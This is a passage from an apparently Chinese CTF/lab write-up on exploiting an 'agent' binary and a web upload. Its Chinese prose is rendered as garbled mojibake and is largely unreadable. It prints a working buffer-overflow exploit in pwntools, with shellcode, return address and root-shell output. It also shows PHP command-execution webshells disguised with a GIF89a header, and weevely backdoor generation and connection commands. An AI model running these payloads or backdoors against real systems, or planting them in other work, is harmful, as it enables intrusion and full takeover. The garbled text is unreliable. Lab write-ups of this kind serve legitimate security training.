class="hljs-number">0xffffd0e4</span> â—‚â€” <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span><br>... â†“<br><span class="hljs-number">07</span>:001câ”‚ <span class="hljs-built_in">edx</span>  <span class="hljs-number">0xffffd0ec</span> â€”â–¸ <span class="hljs-number">0xf7ffd900</span> â—‚â€” <span class="hljs-number">0</span><br><span class="hljs-number">08</span>:<span class="hljs-number">0020</span>â”‚      <span class="hljs-number">0xffffd0f0</span> â€”â–¸ <span class="hljs-number">0xffffd124</span> â€”â–¸ <span class="hljs-number">0xf7dd453c</span> â—‚â€” <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">09</span>:<span class="hljs-number">0024</span>â”‚      <span class="hljs-number">0xffffd0f4</span> â€”â–¸ <span class="hljs-number">0xf7ffdb50</span> â€”â–¸ <span class="hljs-number">0xf7ffdaf0</span> â€”â–¸ <span class="hljs-number">0xf7fcb3e0</span> â€”â–¸ <span class="hljs-number">0xf7ffd990</span> â—‚â€” ...<br>0a:<span class="hljs-number">0028</span>â”‚      <span class="hljs-number">0xffffd0f8</span> â€”â–¸ <span class="hljs-number">0xf7fcb420</span> â€”â–¸ <span class="hljs-number">0x804834a</span> â—‚â€” <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">edi</span> /* <span class="hljs-string">&#x27;GLIBC_2.7&#x27;</span> */<br><span class="hljs-number">0b</span>:002câ”‚      <span class="hljs-number">0xffffd0fc</span> â—‚â€” <span class="hljs-number">0x1</span><br>... â†“<br><span class="hljs-number">0d</span>:<span class="hljs-number">0034</span>â”‚      <span class="hljs-number">0xffffd104</span> â—‚â€” <span class="hljs-number">0x0</span><br>0e:<span class="hljs-number">0038</span>â”‚      <span class="hljs-number">0xffffd108</span> â€”â–¸ <span class="hljs-number">0xf7e49b7d</span> (__overflow+<span class="hljs-number">13</span>) â—‚â€” <span class="hljs-keyword">add</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x16b483</span><br>0f:003câ”‚      <span class="hljs-number">0xffffd10c</span> â€”â–¸ <span class="hljs-number">0xf7fb65e0</span> (_IO_file_jumps) â—‚â€” <span class="hljs-number">0</span><br><span class="hljs-number">10</span>:<span class="hljs-number">0040</span>â”‚      <span class="hljs-number">0xffffd110</span> â€”â–¸ <span class="hljs-number">0xf7ffd000</span> â—‚â€” <span class="hljs-keyword">and</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0xbf</span> /* <span class="hljs-number">0x2bf24</span> */<br><span class="hljs-number">11</span>:<span class="hljs-number">0044</span>â”‚      <span class="hljs-number">0xffffd114</span> â€”â–¸ <span class="hljs-number">0x80482c8</span> â—‚â€” <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-built_in">ebp</span>*<span class="hljs-number">2</span> + <span class="hljs-number">0x62</span>], <span class="hljs-number">ch</span><br><span class="hljs-number">12</span>:<span class="hljs-number">0048</span>â”‚      <span class="hljs-number">0xffffd118</span> â€”â–¸ <span class="hljs-number">0xffffd158</span> â€”â–¸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) â—‚â€” <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">13</span>:004câ”‚      <span class="hljs-number">0xffffd11c</span> â—‚â€” <span class="hljs-number">0x6191c00</span><br><span class="hljs-number">14</span>:<span class="hljs-number">0050</span>â”‚      <span class="hljs-number">0xffffd120</span> â€”â–¸ <span class="hljs-number">0xf7fb5d20</span> (_IO_2_1_stdout_) â—‚â€” <span class="hljs-keyword">xchg</span>   <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">ebp</span> /* <span class="hljs-number">0xfbad2887</span> */<br><span class="hljs-number">15</span>:<span class="hljs-number">0054</span>â”‚      <span class="hljs-number">0xffffd124</span> â€”â–¸ <span class="hljs-number">0xf7dd453c</span> â—‚â€” <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">16</span>:<span class="hljs-number">0058</span>â”‚      <span class="hljs-number">0xffffd128</span> â—‚â€” <span class="hljs-number">0x7</span><br><span class="hljs-number">17</span>:005câ”‚      <span class="hljs-number">0xffffd12c</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">18</span>:<span class="hljs-number">0060</span>â”‚      <span class="hljs-number">0xffffd130</span> â€”â–¸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... â†“<br>1a:<span class="hljs-number">0068</span>â”‚      <span class="hljs-number">0xffffd138</span> â€”â–¸ <span class="hljs-number">0xffffd188</span> â€”â–¸ <span class="hljs-number">0xffffd1b8</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">1b</span>:006câ”‚      <span class="hljs-number">0xffffd13c</span> â€”â–¸ <span class="hljs-number">0xf7e20469</span> (__isoc99_scanf+<span class="hljs-number">41</span>) â—‚â€” <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>, <span class="hljs-number">0x1c</span><br>1c:<span class="hljs-number">0070</span>â”‚      <span class="hljs-number">0xffffd140</span> â€”â–¸ <span class="hljs-number">0xf7fb5580</span> (_IO_2_1_stdin_) â—‚â€” <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">edx</span>], <span class="hljs-number">ah</span> /* <span class="hljs-number">0xfbad2288</span> */<br><span class="hljs-number">1d</span>:<span class="hljs-number">0074</span>â”‚      <span class="hljs-number">0xffffd144</span> â€”â–¸ <span class="hljs-number">0x8048af2</span> â—‚â€” <span class="hljs-keyword">and</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x450a0064</span> /* <span class="hljs-string">&#x27;%d&#x27;</span> */<br>1e:<span class="hljs-number">0078</span>â”‚      <span class="hljs-number">0xffffd148</span> â€”â–¸ <span class="hljs-number">0xffffd164</span> â€”â–¸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>1f:007câ”‚      <span class="hljs-number">0xffffd14c</span> â—‚â€” <span class="hljs-number">0x2</span><br><span class="hljs-number">20</span>:<span class="hljs-number">0080</span>â”‚      <span class="hljs-number">0xffffd150</span> â€”â–¸ <span class="hljs-number">0xffffd178</span> â—‚â€” <span class="hljs-number">0x3</span><br><span class="hljs-number">21</span>:<span class="hljs-number">0084</span>â”‚      <span class="hljs-number">0xffffd154</span> â€”â–¸ <span class="hljs-number">0xf7ffd990</span> â—‚â€” <span class="hljs-number">0</span><br><span class="hljs-number">22</span>:<span class="hljs-number">0088</span>â”‚      <span class="hljs-number">0xffffd158</span> â€”â–¸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) â—‚â€” <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">23</span>:008câ”‚      <span class="hljs-number">0xffffd15c</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">24</span>:<span class="hljs-number">0090</span>â”‚      <span class="hljs-number">0xffffd160</span> â€”â–¸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... â†“<br><span class="hljs-number">26</span>:<span class="hljs-number">0098</span>â”‚      <span class="hljs-number">0xffffd168</span> â€”â–¸ <span class="hljs-number">0xffffd188</span> â€”â–¸ <span class="hljs-number">0xffffd1b8</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">27</span>:009câ”‚      <span class="hljs-number">0xffffd16c</span> â€”â–¸ <span class="hljs-number">0x80487ce</span> (menu+<span class="hljs-number">128</span>) â—‚â€” <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">9</span>], <span class="hljs-built_in">al</span><br><span class="hljs-number">28</span>:00a0â”‚      <span class="hljs-number">0xffffd170</span> â€”â–¸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... â†“<br>2a:00a8â”‚      <span class="hljs-number">0xffffd178</span> â—‚â€” <span class="hljs-number">0x3</span><br>2b:00acâ”‚      <span class="hljs-number">0xffffd17c</span> â—‚â€” <span class="hljs-number">0xa0486ff</span><br>2c:00b0â”‚      <span class="hljs-number">0xffffd180</span> â€”â–¸ <span class="hljs-number">0x8048a75</span> â—‚â€” <span class="hljs-keyword">dec</span>    <span class="hljs-built_in">esp</span> /* <span class="hljs-string">&#x27;Login Validated &#x27;</span> */<br><span class="hljs-number">2d</span>:00b4â”‚      <span class="hljs-number">0xffffd184</span> â€”â–¸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>2e:00b8â”‚ <span class="hljs-built_in">ebp</span>  <span class="hljs-number">0xffffd188</span> â€”â–¸ <span class="hljs-number">0xffffd1b8</span> â—‚â€” <span class="hljs-number">0x0</span><br>2f:00bcâ”‚      <span class="hljs-number">0xffffd18c</span> â€”â–¸ <span class="hljs-number">0x804872f</span> (main+<span class="hljs-number">308</span>) â—‚â€” <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x8048741</span><br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>ä»è€Œè®¡ç®—å¾—å‡ºæ ˆåç§»ä¸ºï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">æ ˆåç§» = <span class="hljs-built_in">EBP</span>åœ°å€ - å½“å‰è¾“å…¥åœ°å€ + <span class="hljs-built_in">EBP</span>å­—é•¿<br>       = <span class="hljs-number">0xd188</span> - <span class="hljs-number">0xd0e4</span> + <span class="hljs-number">4</span> = <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°æ ˆåç§»ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å°† return åœ°å€ä¿®æ”¹ä¸º shellcode åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ ROPgadget å¯»æ‰¾åŒ…å« call eax çš„ä»£ç æ®µï¼Œè¿™é‡Œæ‰¾åˆ° <code>call eax</code> åœ°å€ä¸º 0x8048563 ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent | grep <span class="hljs-string">&quot;call eax&quot;</span></span><br>0x0804855d : adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x08048561 : add al, 8 ; call eax<br>0x08048563 : call eax<br>0x0804855f : cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855c : in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855a : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855e : push 0x804b03c ; call eax<br>0x0804855b : sub esp, 0x14 ; push 0x804b03c ; call eax<br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent --only <span class="hljs-string">&quot;call&quot;</span></span>    <br>Gadgets information<br>============================================================<br>0x08048941 : call dword ptr [eax + 0x68]<br>0x0804892f : call dword ptr [eax - 0x18]<br>0x08048e1f : call dword ptr [ebx + 1]<br>0x08048563 : call eax<br>0x0804859d : call edx<br><br>Unique gadgets found: 5<br></code></pre></td></tr></table></figure><h3 id="3ã€expç¼–å†™"><a href="#3ã€expç¼–å†™" class="headerlink" title="3ã€expç¼–å†™"></a>3ã€expç¼–å†™</h3><p>ç”¨ pwntools ç¼–å†™è„šæœ¬ï¼Œé€šè¿‡ asm æ„é€  shellcode å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># agent</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;192.168.135.146&quot;</span>, <span class="hljs-number">7788</span>)<br><br>shellcode = asm(shellcraft.sh())<br>shell_addr = <span class="hljs-number">0x8048563</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;Agent ID : &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;48093572&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Enter selection: &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>io.recv()<br><br>payload = shellcode.ljust(<span class="hljs-number">168</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(shell_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œï¼Œå¾—åˆ° root æƒé™ï¼Œå¾—åˆ°æœ€ç»ˆ flag6{R2gwc3RQcm90MGMwbHM=} ï¼Œè§£ç ä¸º flag{Gh0stProt0c0ls}ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br>[+] Opening connection to 192.168.135.146 on port 7788: Done<br>[*] Switching to interactive mode<br>Report: jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04\xe1Q\x89\xe11\xd2j\x0bÍ€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc\x85\x04<br>Submitted for review.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>bin<br>boot<br>dev<br>etc<br>home<br>initrd.img<br>initrd.img.old<br>lib<br>lib32<br>lib64<br>libx32<br>lost+found<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>snap<br>srv<br>sys<br>tmp<br>usr<br>var<br>vmlinuz<br>vmlinuz.old<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> root</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>Flag.txt<br>TheEnd.txt<br><span class="hljs-meta">$</span><span class="bash"> cat Flag.txt</span><br>flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br><span class="hljs-meta">$</span><span class="bash"> </span> <br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€çº¯è™šæ‹Ÿé¶åœºï¼šæ‰‹åŠ¨æ“ä½œï¼Œåˆ©ç”¨ web æ¼æ´ï¼Œå¯»æ‰¾ flag ã€‚</p><p>2ã€ç½‘é¡µï¼šæŠ“å­—å…¸</p><p>3ã€ç™»å½•çˆ†ç ´ï¼šhydraã€burpï¼›ç”¨æˆ·åå’Œå¯†ç åˆ†å¼€çˆ†ç ´ã€å¯†ç ç»•è¿‡</p><p>4ã€sqlï¼šsqlmapã€æ–‡ä»¶æ–¹å¼ã€dumpæ…ç”¨</p><p>5ã€æ–‡ä»¶ä¸Šä¼ ï¼šwafã€ç»•è¿‡æ–¹å¼ï¼Œç»“åˆgif/jpgã€eval/system/â€˜â€™</p><p>6ã€ä¸€å¥è¯æˆåŠŸ - å°é©¬å¤§é©¬ï¼šä¸¤æœºé—´æ–‡ä»¶ä¼ è¾“ï¼ˆpython æœ€å®¹æ˜“æˆåŠŸï¼‰</p><p>7ã€åå¼¹é©¬ï¼šbashã€PHPã€javaã€python</p><p>8ã€åå¼¹shellï¼šncã€phpã€pythonï¼ˆæ¸—é€æµ‹è¯•å¿…å¤‡ã€å†…ç½‘æ¸—é€åŸºç¡€ï¼‰</p><p>ä¼ªshell - bin/bashã€bin/shï¼ˆç‰¹æ®ŠåŠŸèƒ½é”®ä¸å¯ç”¨ï¼‰ - ç¨³å®šshellï¼ˆrawï¼šç¨³å®šã€åŸç”Ÿæ€ï¼‰    </p><p>ä¼ªshellï¼šmeterpreter</p><p>bin/bashï¼špython/python3 -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™</p><p>ç¨³å®šshellï¼šctrl + zï¼›stty raw -echoï¼›fg</p><blockquote><p>stty raw -echo    å°±æ˜¯ç”¨RAWæ¨¡å¼æ¥åŸå°ä¸åŠ¨çš„ä¼ è¾“å›æ˜¾æ•°æ®ï¼Œåœ¨è®¾ç½®æ—¶ä¸è¦å›æ˜¾å¤šä½™çš„ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯å¸¸è¯´çš„ç¨³å®šshellã€‚<br>fgï¼ˆfrontgroundï¼‰å‰å°æ‰§è¡Œï¼›bgï¼ˆbackgroundï¼‰åå°æ‰§è¡Œ<br>Linuxæä¾›çš„ fg å’Œ bg å‘½ä»¤ï¼Œå¯ä»¥è°ƒåº¦æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡ã€‚</p></blockquote><p>9ã€ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># eval\system\phpåå¼•å·=&gt;æ‰§è¡Œ(å¯èƒ½å­˜åœ¨è¿‡æ»¤)</span><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `id`; <span class="hljs-meta">?&gt;</span><br><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="äº”ã€å…¶ä»–"><a href="#äº”ã€å…¶ä»–" class="headerlink" title="äº”ã€å…¶ä»–"></a>äº”ã€å…¶ä»–</h2><p><strong>1ã€åœ¨é¶æœºä¸­è·å¾— IDï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> agent</span> <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ltraceç”¨æ¥è·Ÿè¸ªè¿›ç¨‹è°ƒç”¨åº“å‡½æ•°çš„æƒ…å†µ</span><br><span class="hljs-meta">$</span><span class="bash"> ltrace agent</span><br>__libc_start_main(0x80485fb, 1, 0xffe61b74, 0x8048970 &lt;unfinished ...&gt;<br>setbuf(0xf76fad60, 0)                            = &lt;void&gt;<br>asprintf(0xffe61aa8, 0x80489f0, 0x2ddd984, 0xf75620fc) = 8<br>puts(&quot;  ___ __  __ ___ &quot;  ___ __  __ ___ <br>)                        = 18<br>puts(&quot; |_ _|  \\/  | __|  Agent&quot; |_ _|  \/  | __|  Agent<br>)                = 25<br>puts(&quot;  | || |\\/| | _|   Reporting&quot;  | || |\/| | _|   Reporting<br>)            = 29<br>puts(&quot; |___|_|  |_|_|    System\n&quot; |___|_|  |_|_|    System<br><br>)              = 27<br>printf(&quot;\nAgent ID : &quot;<br>Agent ID : )                          = 12<br>fgets(<br>&quot;\n&quot;, 9, 0xf76fa5a0)                       = 0xffe61aae<br>strncmp(&quot;\n&quot;, &quot;48093572&quot;, 8)                     = -1<br>puts(&quot;Invalid Agent ID &quot;Invalid Agent ID <br>)                        = 18<br>+++ exited (status 254) +++<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> agent</span><br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 0<br>Exiting...<br></code></pre></td></tr></table></figure><p><strong>2ã€ç«¯å£æ•²é—¨æœåŠ¡ï¼ˆç«¯å£ç¢°æ’ï¼‰</strong></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/210177505">é¶æœº-ç®€å•è°ˆä¸€ä¸‹ç«¯å£ç¢°æ’æŠ€æœ¯ (Port Knocking) - çŸ¥ä¹ (zhihu.com)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> knock 192.168.135.146 7482 8279 9467  <span class="hljs-comment"># knock</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146   <span class="hljs-comment"># nmap</span></span><br></code></pre></td></tr></table></figure><p><strong>3ã€weevely</strong></p><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/106587791">Weevely(Linuxä¸­çš„èœåˆ€)_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>åé—¨ç”Ÿæˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely generate &lt;è¿æ¥å¯†ç &gt; &lt;file&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely generate <span class="hljs-built_in">test</span> hello.php</span><br>Generated backdoor with password &#x27;test&#x27; in &#x27;hello.php&#x27; of 1486 byte size. <br><span class="hljs-meta">$</span><span class="bash"> find / -name hello.php</span><br>/usr/share/weevely/hello.php<br></code></pre></td></tr></table></figure><p>è¿æ¥åé—¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely &lt;url&gt; &lt;è¿æ¥å¯†ç &gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.110.129/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 3.2.0<br><br>[+] Target:winxp-0947be9ad:C:\phpstudy\WWW<br>[+] Session:/root/.weevely/sessions/192.168.110.129/hello_0.session<br>[+] Shell:System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/b533cd00f6f4.gif hello</span><br></code></pre></td></tr></table></figure><p><strong>4ã€æŸ¥æ‰¾ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -name agent 2&gt;/dev/null  <span class="hljs-comment"># 2&gt;/dev/nullï¼šå°†é”™è¯¯è¾“å‡ºåˆ°/dev/null,åªæ˜¾ç¤ºæ­£ç¡®ç»“æœ</span></span><br>/usr/local/bin/agent<br>/etc/xinetd.d/agent<br></code></pre></td></tr></table></figure><p><strong>5ã€æŸ¥çœ‹ç«¯å£ï¼Œç«¯å£ 7788 ä¹Ÿæœ‰ä»£ç†åœ¨è¿è¡Œ</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -ant</span><br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     <br>tcp        0      0 192.168.135.146:36550   192.168.135.141:1234    ESTABLISHED<br>tcp6       0      0 :::22                   :::*                    LISTEN     <br>tcp6       0      0 :::80                   :::*                    LISTEN     <br>tcp6       0      0 